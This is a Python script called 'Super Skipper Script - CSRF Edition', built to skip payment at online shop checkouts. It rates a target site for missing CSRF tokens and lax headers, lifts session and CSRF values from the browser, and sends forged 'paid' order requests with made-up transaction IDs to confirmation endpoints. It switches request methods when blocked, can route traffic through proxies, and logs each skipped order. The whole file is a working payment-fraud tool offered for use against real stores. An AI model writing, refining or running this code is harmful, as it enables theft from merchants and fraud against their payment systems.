import requests
import random
import string
import time
import webbrowser
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import os

ENDPOINTS = ["/thank_you", "/order/confirmation", "/checkout/success", "/complete"]
REFERERS = ["/checkout", "/payment", "/cart"]

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
}

def generate_order_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def log_result(filename, message):
    with open(filename, "a") as f:
        f.write(f"{time.ctime()}: {message}\n")

def analyze_site(base_url):
    print("Setting up Selenium...")
    options = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    # Explicitly set Chrome binary for Chromebook
    options.binary_location = "/usr/bin/chromium"  # Adjust if different
    
    try:
        driver = webdriver.Chrome(service=ChromeDriverManager().install(), options=options)
        print("Selenium initialized.")
    except Exception as e:
        print(f"Selenium failed: {e}")
        print("Skipping analysis due to setup error.")
        return 50  # Default score if analysis bombs
    
    print(f"Analyzing {base_url}...")
    try:
        driver.get(base_url)
        time.sleep(2)
    except Exception as e:
        print(f"Failed to load {base_url}: {e}")
        driver.quit()
        return 20
    
    is_shopify = "shopify" in driver.page_source.lower() or "collections" in base_url
    score = 50
    
    csrf_found = any("csrf" in elem.get_attribute("name") or "token" in elem.get_attribute("name") 
                     for elem in driver.find_elements("tag name", "input"))
    if csrf_found:
        score -= 30
    else:
        score += 30
    
    cookies = driver.get_cookies()
    leaky_cookies = any("session" in c["name"].lower() or "token" in c["name"].lower() for c in cookies)
    if leaky_cookies:
        score += 20
    
    try:
        response = requests.get(base_url, headers=BASE_HEADERS, timeout=5)
        lax_security = "X-Frame-Options" not in response.headers
        if lax_security:
            score += 10
    except:
        score -= 10
    
    driver.quit()
    score = max(10, min(90, score))
    
    print(f"Analysis: {base_url}")
    print(f"- Shopify: {'Yes' if is_shopify else 'No'}")
    print(f"- CSRF Tokens: {'Found' if csrf_found else 'Not Found'}")
    print(f"- Leaky Cookies: {'Yes' if leaky_cookies else 'No'}")
    print(f"- Lax Headers: {'Yes' if lax_security else 'No'}")
    print(f"Likelihood of Skip Success: {score}%")
    return score

def inspect_cookies_and_csrf(driver):
    cookies = driver.get_cookies()
    exploits = {}
    for cookie in cookies:
        name, value = cookie["name"], cookie["value"]
        if "session" in name.lower():
            exploits["session_id"] = value
        elif "token" in name.lower() or "csrf" in name.lower():
            exploits["csrf_token"] = value
    
    inputs = driver.find_elements("tag name", "input")
    for inp in inputs:
        name = inp.get_attribute("name")
        if name and ("csrf" in name.lower() or "token" in name.lower()):
            exploits["csrf_token"] = inp.get_attribute("value")
            break
    
    return exploits

def skip_payment(base_url, order_id, exploits=None, proxy=None, method="GET"):
    headers = BASE_HEADERS.copy()
    headers["Referer"] = base_url + random.choice(REFERERS)
    
    params = {
        "order_id": order_id,
        "status": "paid",
        "transaction_id": f"txn_{random.randint(100000, 999999)}",
    }
    if exploits:
        params.update(exploits)
    
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    for endpoint in ENDPOINTS:
        url = base_url + endpoint
        try:
            if method == "GET":
                response = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=5)
            else:
                response = requests.post(url, data=params, headers=headers, proxies=proxies, timeout=5)
            
            print(f"{method} Attempt: {response.status_code} - {response.url}")
            if "thank you" in response.text.lower() or "order confirmed" in response.text.lower():
                log_result("success.txt", f"Order {order_id} skipped at {url}")
                return True
            elif response.status_code in [403, 429]:
                print(f"{method} blocked, switching...")
                return skip_payment(base_url, order_id, exploits, proxy, "POST" if method == "GET" else "GET")
            else:
                log_result("errors.txt", f"{url} - {response.status_code}: {response.text[:200]}")
        except requests.RequestException as e:
            log_result("errors.txt", f"{url} - Error: {e}")
    return False

def simple_skip(base_url, proxy):
    order_id = generate_order_id()
    if skip_payment(base_url, order_id, None, proxy):
        print("Simple Skip worked!")
    else:
        print("Simple Skip failed.")

def cookie_skip(base_url, proxy):
    options = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.binary_location = "/usr/bin/chromium"  # Chromebook Linux path
    
    try:
        driver = webdriver.Chrome(service=ChromeDriverManager().install(), options=options)
        print("Selenium for Cookie Skip initialized.")
    except Exception as e:
        print(f"Cookie Skip failed at setup: {e}")
        return
    
    driver.get(base_url + "/checkout")
    input("Navigate to payment page, press Enter...")
    exploits = inspect_cookies_and_csrf(driver)
    print(f"Exploits found: {exploits}")
    driver.quit()
    
    order_id = generate_order_id()
    if skip_payment(base_url, order_id, exploits, proxy):
        print("Cookie Skip with CSRF bypass worked!")
    else:
        print("Cookie Skip failed.")

def main():
    print("Super Skipper Script - CSRF Edition")
    base_url = input("Enter target website (e.g., https://www.example.com): ").rstrip("/")
    proxy = input("Enter proxy (e.g., http://123.45.67.89:8080) or Enter for none: ") or None
    
    print("Starting analysis...")
    likelihood = analyze_site(base_url)
    if input(f"Success likelihood: {likelihood}%. Proceed? (y/n): ").lower() != "y":
        print("Aborted.")
        return
    
    webbrowser.open(base_url)
    print(f"Chrome opened to {base_url}")
    print("Add items, fill delivery, stop at payment.")
    
    while True:
        choice = input("\n1: Simple Skip\n2: Cookie Skip (CSRF Bypass)\nChoice (1/2): ")
        if choice in ["1", "2"]:
            break
        print("1 or 2, mate.")
    
    input("At payment page, press Enter...")
    
    if choice == "1":
        simple_skip(base_url, proxy)
    else:
        cookie_skip(base_url, proxy)

if __name__ == "__main__":
    for file in ["success.txt", "errors.txt"]:
        if not os.path.exists(file):
            open(file, "w").close()
    main()
